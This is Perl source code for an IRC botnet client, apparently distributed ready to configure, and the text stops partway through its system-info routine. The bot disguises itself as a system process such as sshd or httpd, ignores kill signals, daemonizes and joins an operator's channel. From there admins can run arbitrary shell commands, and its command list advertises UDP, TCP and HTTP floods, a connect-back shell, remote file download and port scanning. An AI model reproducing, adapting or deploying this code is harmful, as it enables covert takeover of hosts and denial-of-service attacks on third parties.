#!/usr/bin/perl


######################################################################################################################
## [ Channel ] #################### [ Flood Attack ] ########################### [ Utils ] ###########################
######################################################################################################################
##  !u @join <#channel>	         ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
##  !u @part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
##  !u !uejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
##  !u !deop <channel> <nick>    ##  !u @http <site> <time>                   ##           <recipient> <message>    ##
##  !u !voice <channel> <nick>   ##                                           ##  !u pwd;uname -a;id <for example>  ##
##  !u !devoice <channel> <nick> ##  !u @ctcpflood <nick>                     ##  !u @port <ip> <port>              ##
##  !u !nick <newnick>           ##  !u @msgflood <nick>                      ##  !u @dns <ip/host>                 ##
##  !u !msg <nick>               ##  !u @noticeflood <nick>                   ##                                    ##
##  !u !quit                     ##                                           ##                                    ##
##  !u !uaw                      ##                                           ##                                    ##
##  !u @die                      ##                                           ##                                    ##
##                               ##                                           ##                                    ##
######################################################################################################################
######################################################################################################################

#############################
##### [ Configuration ] #####
#############################

my @rps = ("/usr/local/apache/bin/httpd -DSSL",
		  "/usr/sbin/httpd -k start -DSSL",
          "/usr/sbin/httpd",
		  "/usr/sbin/sshd -i",
		  "/usr/sbin/sshd",
	      "/usr/sbin/sshd -D",
          "/usr/sbin/apache2 -k start",
	      "/sbin/syslogd",
	      "/sbin/klogd -c 1 -x -x",
		  "/usr/sbin/acpid",
		  "/usr/sbin/cron");
my $process = $rps[rand scalar @rps];

my @rversion = ("\001VERSION - unknown command.\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001",
				"\001mIRC 2018 by GamerLoLy and #Elena\001");
my $vers = $rversion[rand scalar @rversion];

my @rircname = ("BoT[00] - [#E]","BoT[01] - [#E]","BoT[02] - [#E]","BoT[03] - [#E]","BoT[04] - [#E]","BoT[05] - [#E]","BoT[06] - [#E]","BoT[07] - [#E]","BoT[08] - [#E]","BoT[09] - [#E]",
				"BoT[10] - [#E]","BoT[11] - [#E]","BoT[12] - [#E]","BoT[13] - [#E]","BoT[14] - [#E]","BoT[15] - [#E]","BoT[16] - [#E]","BoT[17] - [#E]","BoT[18] - [#E]","BoT[19] - [#E]",
				"BoT[20] - [#E]","BoT[21] - [#E]","BoT[22] - [#E]","BoT[23] - [#E]","BoT[24] - [#E]","BoT[25] - [#E]","BoT[26] - [#E]","BoT[27] - [#E]","BoT[28] - [#E]","BoT[29] - [#E]",
				"BoT[30] - [#E]","BoT[31] - [#E]","BoT[32] - [#E]","BoT[33] - [#E]","BoT[34] - [#E]","BoT[35] - [#E]","BoT[36] - [#E]","BoT[37] - [#E]","BoT[38] - [#E]","BoT[39] - [#E]",
				"BoT[40] - [#E]","BoT[41] - [#E]","BoT[42] - [#E]","BoT[43] - [#E]","BoT[44] - [#E]","BoT[45] - [#E]","BoT[46] - [#E]","BoT[47] - [#E]","BoT[48] - [#E]","BoT[49] - [#E]",
				"BoT[50] - [#E]","BoT[51] - [#E]","BoT[52] - [#E]","BoT[53] - [#E]","BoT[54] - [#E]","BoT[55] - [#E]","BoT[56] - [#E]","BoT[57] - [#E]","BoT[58] - [#E]","BoT[59] - [#E]",
				"BoT[60] - [#E]","BoT[61] - [#E]","BoT[62] - [#E]","BoT[63] - [#E]","BoT[64] - [#E]","BoT[65] - [#E]","BoT[66] - [#E]","BoT[67] - [#E]","BoT[68] - [#E]","BoT[69] - [#E]",
				"BoT[70] - [#E]","BoT[71] - [#E]","BoT[72] - [#E]","BoT[73] - [#E]","BoT[74] - [#E]","BoT[75] - [#E]","BoT[76] - [#E]","BoT[77] - [#E]","BoT[78] - [#E]","BoT[79] - [#E]",
				"BoT[80] - [#E]","BoT[81] - [#E]","BoT[82] - [#E]","BoT[83] - [#E]","BoT[84] - [#E]","BoT[85] - [#E]","BoT[86] - [#E]","BoT[87] - [#E]","BoT[88] - [#E]","BoT[89] - [#E]",
				"BoT[90] - [#E]","BoT[91] - [#E]","BoT[92] - [#E]","BoT[93] - [#E]","BoT[94] - [#E]","BoT[95] - [#E]","BoT[96] - [#E]","BoT[97] - [#E]","BoT[98] - [#E]","BoT[99] - [#E]",
				"BoT[100] - [#E]","BoT[101] - [#E]","BoT[102] - [#E]","BoT[103] - [#E]","BoT[104] - [#E]","BoT[105] - [#E]","BoT[106] - [#E]","BoT[107] - [#E]","BoT[108] - [#E]","BoT[109] - [#E]",
				"BoT[110] - [#E]","BoT[111] - [#E]","BoT[112] - [#E]","BoT[113] - [#E]","BoT[114] - [#E]","BoT[115] - [#E]","BoT[116] - [#E]","BoT[117] - [#E]","BoT[118] - [#E]","BoT[119] - [#E]",
				"BoT[120] - [#E]","BoT[121] - [#E]","BoT[122] - [#E]","BoT[123] - [#E]","BoT[124] - [#E]","BoT[125] - [#E]","BoT[126] - [#E]","BoT[127] - [#E]","BoT[128] - [#E]","BoT[129] - [#E]",
				"BoT[130] - [#E]","BoT[131] - [#E]","BoT[132] - [#E]","BoT[133] - [#E]","BoT[134] - [#E]","BoT[135] - [#E]","BoT[136] - [#E]","BoT[137] - [#E]","BoT[138] - [#E]","BoT[139] - [#E]",
				"BoT[140] - [#E]","BoT[141] - [#E]","BoT[142] - [#E]","BoT[143] - [#E]","BoT[144] - [#E]","BoT[145] - [#E]","BoT[146] - [#E]","BoT[147] - [#E]","BoT[148] - [#E]","BoT[149] - [#E]",
				"BoT[150] - [#E]","BoT[151] - [#E]","BoT[152] - [#E]","BoT[153] - [#E]","BoT[154] - [#E]","BoT[155] - [#E]","BoT[156] - [#E]","BoT[157] - [#E]","BoT[158] - [#E]","BoT[159] - [#E]",
				"BoT[160] - [#E]","BoT[161] - [#E]","BoT[162] - [#E]","BoT[163] - [#E]","BoT[164] - [#E]","BoT[165] - [#E]","BoT[166] - [#E]","BoT[167] - [#E]","BoT[168] - [#E]","BoT[169] - [#E]",
				"BoT[170] - [#E]","BoT[171] - [#E]","BoT[172] - [#E]","BoT[173] - [#E]","BoT[174] - [#E]","BoT[175] - [#E]","BoT[176] - [#E]","BoT[177] - [#E]","BoT[178] - [#E]","BoT[179] - [#E]",
				"BoT[180] - [#E]","BoT[181] - [#E]","BoT[182] - [#E]","BoT[183] - [#E]","BoT[184] - [#E]","BoT[185] - [#E]","BoT[186] - [#E]","BoT[187] - [#E]","BoT[188] - [#E]","BoT[189] - [#E]",
				"BoT[190] - [#E]","BoT[191] - [#E]","BoT[192] - [#E]","BoT[193] - [#E]","BoT[194] - [#E]","BoT[195] - [#E]","BoT[196] - [#E]","BoT[197] - [#E]","BoT[198] - [#E]","BoT[199] - [#E]",
				"BoT[200] - [#E]","BoT[201] - [#E]","BoT[202] - [#E]","BoT[203] - [#E]","BoT[204] - [#E]","BoT[205] - [#E]","BoT[206] - [#E]","BoT[207] - [#E]","BoT[208] - [#E]","BoT[209] - [#E]",
				"BoT[210] - [#E]","BoT[211] - [#E]","BoT[212] - [#E]","BoT[213] - [#E]","BoT[214] - [#E]","BoT[215] - [#E]","BoT[216] - [#E]","BoT[217] - [#E]","BoT[218] - [#E]","BoT[219] - [#E]",
				"BoT[220] - [#E]","BoT[221] - [#E]","BoT[222] - [#E]","BoT[223] - [#E]","BoT[224] - [#E]","BoT[225] - [#E]","BoT[226] - [#E]","BoT[227] - [#E]","BoT[228] - [#E]","BoT[229] - [#E]",
				"BoT[230] - [#E]","BoT[231] - [#E]","BoT[232] - [#E]","BoT[233] - [#E]","BoT[234] - [#E]","BoT[235] - [#E]","BoT[236] - [#E]","BoT[237] - [#E]","BoT[238] - [#E]","BoT[239] - [#E]",
				"BoT[240] - [#E]","BoT[241] - [#E]","BoT[242] - [#E]","BoT[243] - [#E]","BoT[244] - [#E]","BoT[245] - [#E]","BoT[246] - [#E]","BoT[247] - [#E]","BoT[248] - [#E]","BoT[249] - [#E]",
				"BoT[250] - [#E]","BoT[251] - [#E]","BoT[252] - [#E]","BoT[253] - [#E]","BoT[254] - [#E]","BoT[255] - [#E]","BoT[256] - [#E]","BoT[257] - [#E]","BoT[258] - [#E]","BoT[259] - [#E]",
				"BoT[260] - [#E]","BoT[261] - [#E]","BoT[262] - [#E]","BoT[263] - [#E]","BoT[264] - [#E]","BoT[265] - [#E]","BoT[266] - [#E]","BoT[267] - [#E]","BoT[268] - [#E]","BoT[269] - [#E]",
				"BoT[270] - [#E]","BoT[271] - [#E]","BoT[272] - [#E]","BoT[273] - [#E]","BoT[274] - [#E]","BoT[275] - [#E]","BoT[276] - [#E]","BoT[277] - [#E]","BoT[278] - [#E]","BoT[279] - [#E]",
				"BoT[280] - [#E]","BoT[281] - [#E]","BoT[282] - [#E]","BoT[283] - [#E]","BoT[284] - [#E]","BoT[285] - [#E]","BoT[286] - [#E]","BoT[287] - [#E]","BoT[288] - [#E]","BoT[289] - [#E]",
				"BoT[290] - [#E]","BoT[291] - [#E]","BoT[292] - [#E]","BoT[293] - [#E]","BoT[294] - [#E]","BoT[295] - [#E]","BoT[296] - [#E]","BoT[297] - [#E]","BoT[298] - [#E]","BoT[299] - [#E]",
				"BoT[300] - [#E]","BoT[301] - [#E]","BoT[302] - [#E]","BoT[303] - [#E]","BoT[304] - [#E]","BoT[305] - [#E]","BoT[306] - [#E]","BoT[307] - [#E]","BoT[308] - [#E]","BoT[309] - [#E]",
				"BoT[310] - [#E]","BoT[311] - [#E]","BoT[312] - [#E]","BoT[313] - [#E]","BoT[314] - [#E]","BoT[315] - [#E]","BoT[316] - [#E]","BoT[317] - [#E]","BoT[318] - [#E]","BoT[319] - [#E]",
				"BoT[320] - [#E]","BoT[321] - [#E]","BoT[322] - [#E]","BoT[323] - [#E]","BoT[324] - [#E]","BoT[325] - [#E]","BoT[326] - [#E]","BoT[327] - [#E]","BoT[328] - [#E]","BoT[329] - [#E]",
				"BoT[330] - [#E]","BoT[331] - [#E]","BoT[332] - [#E]","BoT[333] - [#E]","BoT[334] - [#E]","BoT[335] - [#E]","BoT[336] - [#E]","BoT[337] - [#E]","BoT[338] - [#E]","BoT[339] - [#E]",
				"BoT[340] - [#E]","BoT[341] - [#E]","BoT[342] - [#E]","BoT[343] - [#E]","BoT[344] - [#E]","BoT[345] - [#E]","BoT[346] - [#E]","BoT[347] - [#E]","BoT[348] - [#E]","BoT[349] - [#E]",
				"BoT[350] - [#E]","BoT[351] - [#E]","BoT[352] - [#E]","BoT[353] - [#E]","BoT[354] - [#E]","BoT[355] - [#E]","BoT[356] - [#E]","BoT[357] - [#E]","BoT[358] - [#E]","BoT[359] - [#E]",
				"BoT[360] - [#E]","BoT[361] - [#E]","BoT[362] - [#E]","BoT[363] - [#E]","BoT[364] - [#E]","BoT[365] - [#E]","BoT[366] - [#E]","BoT[367] - [#E]","BoT[368] - [#E]","BoT[369] - [#E]",
				"BoT[370] - [#E]","BoT[371] - [#E]","BoT[372] - [#E]","BoT[373] - [#E]","BoT[374] - [#E]","BoT[375] - [#E]","BoT[376] - [#E]","BoT[377] - [#E]","BoT[378] - [#E]","BoT[379] - [#E]",
				"BoT[380] - [#E]","BoT[381] - [#E]","BoT[382] - [#E]","BoT[383] - [#E]","BoT[384] - [#E]","BoT[385] - [#E]","BoT[386] - [#E]","BoT[387] - [#E]","BoT[388] - [#E]","BoT[389] - [#E]",
				"BoT[390] - [#E]","BoT[391] - [#E]","BoT[392] - [#E]","BoT[393] - [#E]","BoT[394] - [#E]","BoT[395] - [#E]","BoT[396] - [#E]","BoT[397] - [#E]","BoT[398] - [#E]","BoT[399] - [#E]",
				"BoT[400] - [#E]","BoT[401] - [#E]","BoT[402] - [#E]","BoT[403] - [#E]","BoT[404] - [#E]","BoT[405] - [#E]","BoT[406] - [#E]","BoT[407] - [#E]","BoT[408] - [#E]","BoT[409] - [#E]",
				"BoT[410] - [#E]","BoT[411] - [#E]","BoT[412] - [#E]","BoT[413] - [#E]","BoT[414] - [#E]","BoT[415] - [#E]","BoT[416] - [#E]","BoT[417] - [#E]","BoT[418] - [#E]","BoT[419] - [#E]",
				"BoT[420] - [#E]","BoT[421] - [#E]","BoT[422] - [#E]","BoT[423] - [#E]","BoT[424] - [#E]","BoT[425] - [#E]","BoT[426] - [#E]","BoT[427] - [#E]","BoT[428] - [#E]","BoT[429] - [#E]",
				"BoT[430] - [#E]","BoT[431] - [#E]","BoT[432] - [#E]","BoT[433] - [#E]","BoT[434] - [#E]","BoT[435] - [#E]","BoT[436] - [#E]","BoT[437] - [#E]","BoT[438] - [#E]","BoT[439] - [#E]",
				"BoT[440] - [#E]","BoT[441] - [#E]","BoT[442] - [#E]","BoT[443] - [#E]","BoT[444] - [#E]","BoT[445] - [#E]","BoT[446] - [#E]","BoT[447] - [#E]","BoT[448] - [#E]","BoT[449] - [#E]",
				"BoT[450] - [#E]","BoT[451] - [#E]","BoT[452] - [#E]","BoT[453] - [#E]","BoT[454] - [#E]","BoT[455] - [#E]","BoT[456] - [#E]","BoT[457] - [#E]","BoT[458] - [#E]","BoT[459] - [#E]",
				"BoT[460] - [#E]","BoT[461] - [#E]","BoT[462] - [#E]","BoT[463] - [#E]","BoT[464] - [#E]","BoT[465] - [#E]","BoT[466] - [#E]","BoT[467] - [#E]","BoT[468] - [#E]","BoT[469] - [#E]",
				"BoT[470] - [#E]","BoT[471] - [#E]","BoT[472] - [#E]","BoT[473] - [#E]","BoT[474] - [#E]","BoT[475] - [#E]","BoT[476] - [#E]","BoT[477] - [#E]","BoT[478] - [#E]","BoT[479] - [#E]",
				"BoT[480] - [#E]","BoT[481] - [#E]","BoT[482] - [#E]","BoT[483] - [#E]","BoT[484] - [#E]","BoT[485] - [#E]","BoT[486] - [#E]","BoT[487] - [#E]","BoT[488] - [#E]","BoT[489] - [#E]",
				"BoT[490] - [#E]","BoT[491] - [#E]","BoT[492] - [#E]","BoT[493] - [#E]","BoT[494] - [#E]","BoT[495] - [#E]","BoT[496] - [#E]","BoT[497] - [#E]","BoT[498] - [#E]","BoT[499] - [#E]",
				"BoT[500] - [#E]","BoT[501] - [#E]","BoT[502] - [#E]","BoT[503] - [#E]","BoT[504] - [#E]","BoT[505] - [#E]","BoT[506] - [#E]","BoT[507] - [#E]","BoT[508] - [#E]","BoT[509] - [#E]",
				"BoT[510] - [#E]","BoT[511] - [#E]","BoT[512] - [#E]","BoT[513] - [#E]","BoT[514] - [#E]","BoT[515] - [#E]","BoT[516] - [#E]","BoT[517] - [#E]","BoT[518] - [#E]","BoT[519] - [#E]",
				"BoT[520] - [#E]","BoT[521] - [#E]","BoT[522] - [#E]","BoT[523] - [#E]","BoT[524] - [#E]","BoT[525] - [#E]","BoT[526] - [#E]","BoT[527] - [#E]","BoT[528] - [#E]","BoT[529] - [#E]",
				"BoT[530] - [#E]","BoT[531] - [#E]","BoT[532] - [#E]","BoT[533] - [#E]","BoT[534] - [#E]","BoT[535] - [#E]","BoT[536] - [#E]","BoT[537] - [#E]","BoT[538] - [#E]","BoT[539] - [#E]",
				"BoT[540] - [#E]","BoT[541] - [#E]","BoT[542] - [#E]","BoT[543] - [#E]","BoT[544] - [#E]","BoT[545] - [#E]","BoT[546] - [#E]","BoT[547] - [#E]","BoT[548] - [#E]","BoT[549] - [#E]",
				"BoT[550] - [#E]","BoT[551] - [#E]","BoT[552] - [#E]","BoT[553] - [#E]","BoT[554] - [#E]","BoT[555] - [#E]","BoT[556] - [#E]","BoT[557] - [#E]","BoT[558] - [#E]","BoT[559] - [#E]",
				"BoT[560] - [#E]","BoT[561] - [#E]","BoT[562] - [#E]","BoT[563] - [#E]","BoT[564] - [#E]","BoT[565] - [#E]","BoT[566] - [#E]","BoT[567] - [#E]","BoT[568] - [#E]","BoT[569] - [#E]",
				"BoT[570] - [#E]","BoT[571] - [#E]","BoT[572] - [#E]","BoT[573] - [#E]","BoT[574] - [#E]","BoT[575] - [#E]","BoT[576] - [#E]","BoT[577] - [#E]","BoT[578] - [#E]","BoT[579] - [#E]",
				"BoT[580] - [#E]","BoT[581] - [#E]","BoT[582] - [#E]","BoT[583] - [#E]","BoT[584] - [#E]","BoT[585] - [#E]","BoT[586] - [#E]","BoT[587] - [#E]","BoT[588] - [#E]","BoT[589] - [#E]",
				"BoT[590] - [#E]","BoT[591] - [#E]","BoT[592] - [#E]","BoT[593] - [#E]","BoT[594] - [#E]","BoT[595] - [#E]","BoT[596] - [#E]","BoT[597] - [#E]","BoT[598] - [#E]","BoT[599] - [#E]",
				"BoT[600] - [#E]");

my $ircname = $rircname[rand scalar @rircname];

## my @rrealname = ("4,1[ GamerLoLy start HACKED ]",
## 				   "4,1 /!\ GamerLoLy start HACKED /!\ ",
##				   "12,1<///8,1///4,1###>",
##                 "2,1---=== 4,1 GamerLoLy start HACKED 2,1===---");
## chop (my $realname = $rrealname[rand scalar @rrealname]);

chop (my $realname = $rircname[rand scalar @rircname]);

## my @nickname = ("GamerLoLy");
## my $nick =$nickname[rand scalar @nickname];

my $nick =$rircname[rand scalar @rircname];

$server = 'ip-ul de la vps' unless $server;
my $port = 'aici pui portul ex:7777';

my $linas_max='8';
my $sleep='5';

my $homedir ="/tmp";
my $version = 'Irc 2018 - GamerLoLy and #Elena';

my @admins = ("Aici pui numele la admin");
my @hostauth = ("host-ul pe care l-ai setat in unrealircd.con");
my @channels = ("Channel-ul pe care l-ai setat in unrealircd.con unde sa intre perli/pma-urile");

my $pacotes = 1;

#################################################################
##### [ Stop Editing if you dont know what are you doing. ] #####
#################################################################

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use Socket;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;

chdir("$homedir");

$server="$ARGV[0]"if $ARGV[0];
$0="$process"."\0"x16;;
my $pid=fork;
exit if $pid;
die"Can't fork in background: $!"unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket"$_[1]\n";
  } else {
    print $IRC_cur_socket"$_[0]\n";
  }
}

sub getstore ($$)
{
  my $url = shift;
  my $file = shift;
  $http_stream_out = 1;
  open(GET_OUTFILE,"> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

sub _get
{
  my $url = shift;
  my $proxy ="";
  grep {(lc($_) eq"http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq"") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path ="/"unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  $AGENT ="get-minimal";
  $VERSION ="20000118";
  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .=":$port"if $port != 80;
  my $request ="GET $path HTTP/1.0\015\012"
              ."Host: $netloc\015\012"
              ."User-Agent: $AGENT/$VERSION/u\015\012";
  $request .="Pragma: no-cache\015\012"if ($main::http_no_cache);
  $request .="\015\012";
  print $sock $request;

  my $buf ="";
  my $n;
  my $b1 ="";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq"") {
      $b1 = $buf;
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf =""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}

sub conectar {
  my $meunick = $_[0];
  my $server_con = $_[1];
  my $port_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server_con",
  PeerPort=>$port_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} ="$server_con";
    $irc_servers{$IRC_cur_socket}{'port'} ="$port_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname".$IRC_socket->sockhost."$server_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick","$server","$port"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {
      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
        } else {
      $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn","".$vers."");
    }
	if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
    if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
    if ($onde eq"$meunick"){
    shell("$pn","$args");
  }
  if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1");
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde","$arg");
    }
  }
}
}
}

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
  if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
  }
  } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
  nick("$meunick-".int rand(9999));
  } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
  $meunick = $2;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
  $irc_servers{$IRC_cur_socket}{'nome'} ="$1";
  foreach my $canal (@channels) {
	sendraw("MODE $nick +x");
    sendraw("JOIN $canal");
	sendraw("PRIVMSG $canal :4,1 [#IRC] 9,1P̵̡͎̤̪̬͔̃͐͋o̶̠̘͎̜̭͈̺̥̳͈͒s̸̡̛͕̹̞̤̤̘̎̈́̈́͊͗̽͆ĩ̸̢̡̨̨̮̝̫̯͇̺̾̕ḇ̵̢̙̱̺̫̻̲͑́̊͋͒̽͘ͅī̴̧̖l̸̢̧͉̞̹̈́ ̶̞̱̟̜̬̖̤́̓n̶̗̖̺̟̺͓̿͛̊͗͗u̵̳̠̠͙̱̰̽̊͊̈́͋̓ ̶̮̤̊͊͑̒̈̚̚͠o̷͔̳̯̜̿̀̀͗̿̈̕ ̶̢͖̠̞̅͊͋̍̈́́s̵̱̙̭̈́̓̓͊͠ą̸̤̆̇̃͜-̷̨̥̜̫͇̱̥̈̋͐̐̀̃̓́͜͜͝ͅț̷̝͚̪̟̞͐͂̾̋͠ĩ̵̹̾̋̎́̀̊ ̸̗͚͈̼̘̔͘r̴͚͂͐̽̿͑͋͋̚ė̵̱͊̑̊̍̅̇̽ȕ̵̳̦ș̵͍̞̽̂̃̋̉̉̈́͝͝e̴̠̫̔̍̋͗̐̕a̸̙͚͙̥͈͓̘͌̇̑̽̈́̀ş̵̨̲̥̲̳́̌͑̈́̓̉ͅc̷̮͚̖̮͔̉̀́̿ẳ̶̘̜̜͕̮̓̅̐́̈́̀̈͜͠͝,̷̧͇͖̣̝̝̺̻̐̈́̔̈́͐̄̂̂͒͝ ̷͓͓͇̄d̶̝̗̙͔͇̯̻͊͜ḁ̶̡̲̰͈̺͓̻͆̀́͗́̿ṟ̵͉̣̪͌͒̄͂ ̸̻͇̒̃̒̓̾̍m̶̨̧͎͙͙̣̗͉̥͓̋̓̔͑̇́͠ë̵̩̱̜͎̣́ṛ̷͎̙̙̩̭̗̿́̿̏͂ì̸̛̯̞̄̃̀̍̏ţ̶̪̖̤͙̫̟̣̮̂̉̐̌̑͘ă̴̡̛͖̰̞̱̩̭͜ ̴̢̛̞̩̻͇̈́̈́͊ͅî̶̮̬͖̗̔͋̓̂͑̂̾͘͠ň̵̡̡̖̪̯͘ť̷̹̰̲͔̘͔̙̘̞̖ơ̴̻̮̮̱̖͍̮̓͋̓̄̀̀̈́͝t̶̛͇̋͆̅͗̋̑͘͘d̶̫̩͇͕̞͔͚̑̃͜ȩ̵̻̾̽̎̆̑̉́͝a̴̢̗̟͖̲̔̏̐̃͌̾͜ͅu̴͓̳̓̋͗̾̇͆ņ̸͎͖͕̰̙͚̏́à̸̛̟̗̣̙͗͋͊ͅ ̸͎̓͛̏̆͆͂̌̂͝ṣ̷̡̧̠̮͙̀̽̈͛͊̊̇͛͝ă̷̮̆͑ ̷̛̜͈̲͌̅̉̿̿̄̄̚î̵̢̢̡̘̜̖͚̬̔̅͠n̴͚̞̩̠͕̣̻̺̱̊c̷̥̥̫̓̿͌̂̈́̾͐̀͗̐ȅ̸̻̘̝̲̟̳̟̤̀̈́̂͋̕͝͝r̸̢̢̙͈̭͊͗̄̇͘c̵̬͈̅ĩ̶͖̟͓̮̥̻̭͙͊. ❤ ");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
  if (my $pid = fork) {
  waitpid($pid, 0);
  } else {
  if (fork) {
  exit;
  } else {
###########################
##### [ Help Module ] #####
###########################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1======================= ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1GamerLoLy PerlBot - Main Help:  ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1======================= ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1system              ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1version             ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1channel             ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1flood               ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1utils               ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1======================= ");
}

if ($funcarg =~ /^system/) {
	$uptime=`uptime`;
	$ownd=`pwd`; 
	$id=`id`;
	$uname=`uname -srp`;
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1=================== ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1Bot Configuration:  ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1=================== ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*Server       : 12$server");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*Port         : 12$port");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*Channels     : 12@channels");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*uname -a     : 12$uname");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*uptime       : 12$uptime");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*FakeProcess  : 12$process");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*ProcessPID   : 12$$");
